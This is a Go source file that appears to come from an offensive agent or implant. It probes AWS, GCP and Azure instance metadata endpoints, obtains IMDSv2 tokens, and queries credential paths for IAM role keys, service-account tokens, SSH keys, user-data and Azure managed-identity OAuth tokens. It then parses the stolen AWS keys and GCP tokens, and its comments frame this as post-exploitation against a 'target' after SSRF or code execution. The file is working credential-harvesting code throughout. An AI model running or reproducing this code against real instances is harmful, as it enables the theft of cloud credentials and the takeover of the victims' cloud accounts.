// Package cloudgo implements cloud-provider primitives on the agent. It is
// the Go analogue of Program/cloud/ and shares the IMDS paths and API
// shapes with the Python side.
//
// Instance Metadata Service (IMDS) probes for AWS / GCP / Azure. Each cloud
// exposes a well-known address reachable from any process on an instance:
//
//   AWS     http://169.254.169.254/latest/meta-data/
//   GCP     http://metadata.google.internal/computeMetadata/v1/
//   Azure   http://169.254.169.254/metadata/instance?api-version=...
//
// AWS IMDSv1 is headerless — an SSRF or code exec reaches credentials in
// one HTTP GET. IMDSv2 requires a PUT token first; many instances still
// run v1 in parallel. GCP and Azure require a spoofable header
// (Metadata-Flavor / Metadata).
package cloudgo

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// IMDSOptions controls a metadata probe.
type IMDSOptions struct {
	Timeout time.Duration // per request; default 4s
}

func defaultTimeout(t time.Duration) time.Duration {
	if t <= 0 {
		return 4 * time.Second
	}
	return t
}

// ProbeResult is one URL's response.
type ProbeResult struct {
	Cloud  string `json:"cloud"`
	URL    string `json:"url"`
	OK     bool   `json:"ok"`
	Status int    `json:"status"`
	Body   string `json:"body"`
	Error  string `json:"error,omitempty"`
}

// fetchGet does one HTTP GET.
func fetchGet(url string, headers map[string]string, timeout time.Duration) (int, string, error) {
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return 0, "", err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	client := &http.Client{
		Timeout: defaultTimeout(timeout),
		CheckRedirect: func(r *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return resp.StatusCode, string(body), nil
}

// imdsv2Token requests an AWS IMDSv2 session token. Returns "" on failure.
func imdsv2Token(timeout time.Duration) string {
	req, err := http.NewRequest(http.MethodPut, "http://169.254.169.254/latest/api/token", nil)
	if err != nil {
		return ""
	}
	req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
	client := &http.Client{Timeout: defaultTimeout(timeout)}
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	return strings.TrimSpace(string(body))
}

// awsPaths is the AWS IMDS path list. Same as the Python side.
var awsPaths = []string{
	"/latest/meta-data/",
	"/latest/meta-data/iam/security-credentials/",
	"/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
	"/latest/user-data",
	"/latest/dynamic/instance-identity/document",
}

// gcpPaths is the GCP metadata path list.
var gcpPaths = []string{
	"/computeMetadata/v1/",
	"/computeMetadata/v1/instance/service-accounts/",
	"/computeMetadata/v1/instance/service-accounts/default/token",
	"/computeMetadata/v1/project/attributes/ssh-keys",
	"/computeMetadata/v1/instance/attributes/",
}

// azurePaths is the Azure IMDS path list.
var azurePaths = []string{
	"/metadata/instance?api-version=2021-02-01",
	"/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
	"/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net",
	"/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/",
}

// ProbeAWS hits the AWS IMDS paths. If IMDSv2 is enabled it uses the token.
func ProbeAWS(opts IMDSOptions) []ProbeResult {
	token := imdsv2Token(opts.Timeout)
	headers := map[string]string{}
	if token != "" {
		headers["X-aws-ec2-metadata-token"] = token
	}
	results := make([]ProbeResult, 0, len(awsPaths))
	for _, p := range awsPaths {
		url := "http://169.254.169.254" + p
		code, body, err := fetchGet(url, headers, opts.Timeout)
		r := ProbeResult{Cloud: "aws", URL: url}
		if err != nil {
			r.Error = err.Error()
		} else if code == 200 {
			r.OK = true
			r.Status = code
			r.Body = body
		} else {
			r.Status = code
		}
		results = append(results, r)
	}
	return results
}

// ProbeGCP hits the GCP metadata paths.
func ProbeGCP(opts IMDSOptions) []ProbeResult {
	headers := map[string]string{"Metadata-Flavor": "Google"}
	results := make([]ProbeResult, 0, len(gcpPaths))
	for _, p := range gcpPaths {
		url := "http://metadata.google.internal" + p
		code, body, err := fetchGet(url, headers, opts.Timeout)
		r := ProbeResult{Cloud: "gcp", URL: url}
		if err != nil {
			r.Error = err.Error()
		} else if code == 200 {
			r.OK = true
			r.Status = code
			r.Body = body
		} else {
			r.Status = code
		}
		results = append(results, r)
	}
	return results
}

// ProbeAzure hits the Azure IMDS paths.
func ProbeAzure(opts IMDSOptions) []ProbeResult {
	headers := map[string]string{"Metadata": "true"}
	results := make([]ProbeResult, 0, len(azurePaths))
	for _, p := range azurePaths {
		url := "http://169.254.169.254" + p
		code, body, err := fetchGet(url, headers, opts.Timeout)
		r := ProbeResult{Cloud: "azure", URL: url}
		if err != nil {
			r.Error = err.Error()
		} else if code == 200 {
			r.OK = true
			r.Status = code
			r.Body = body
		} else {
			r.Status = code
		}
		results = append(results, r)
	}
	return results
}

// ProbeChain tries AWS then GCP then Azure and returns every hit from the
// first cloud that responds. Used from the agent when the target's cloud
// is not known up front.
func ProbeChain(opts IMDSOptions) (string, []ProbeResult) {
	for _, fn := range []struct {
		name string
		call func(IMDSOptions) []ProbeResult
	}{
		{"aws", ProbeAWS},
		{"gcp", ProbeGCP},
		{"azure", ProbeAzure},
	} {
		results := fn.call(opts)
		for _, r := range results {
			if r.OK {
				return fn.name, results
			}
		}
	}
	return "", nil
}

// AWSCredentials is the shape of the IAM role credentials JSON returned by
// /latest/meta-data/iam/security-credentials/<role>.
type AWSCredentials struct {
	Code            string `json:"Code"`
	Type            string `json:"Type"`
	AccessKeyID     string `json:"AccessKeyId"`
	SecretAccessKey string `json:"SecretAccessKey"`
	Token           string `json:"Token"`
	Expiration      string `json:"Expiration"`
}

// ExtractAWSCredentials parses the JSON body of the IAM-role-credentials
// path. Returns the parsed struct or an error.
func ExtractAWSCredentials(body string) (AWSCredentials, error) {
	var c AWSCredentials
	body = strings.TrimSpace(body)
	if body == "" {
		return c, fmt.Errorf("cloudgo: empty body")
	}
	if err := json.Unmarshal([]byte(body), &c); err != nil {
		return c, fmt.Errorf("cloudgo: parse: %w", err)
	}
	if c.AccessKeyID == "" || c.SecretAccessKey == "" {
		return c, fmt.Errorf("cloudgo: credentials incomplete")
	}
	return c, nil
}

// GCPToken is the shape of the default SA token response.
type GCPToken struct {
	AccessToken string `json:"access_token"`
	ExpiresIn   int    `json:"expires_in"`
	TokenType   string `json:"token_type"`
}

// ExtractGCPToken parses the default service-account token JSON.
func ExtractGCPToken(body string) (GCPToken, error) {
	var t GCPToken
	if err := json.Unmarshal(bytes.TrimSpace([]byte(body)), &t); err != nil {
		return t, fmt.Errorf("cloudgo: parse gcp token: %w", err)
	}
	if t.AccessToken == "" {
		return t, fmt.Errorf("cloudgo: no access_token")
	}
	return t, nil
}
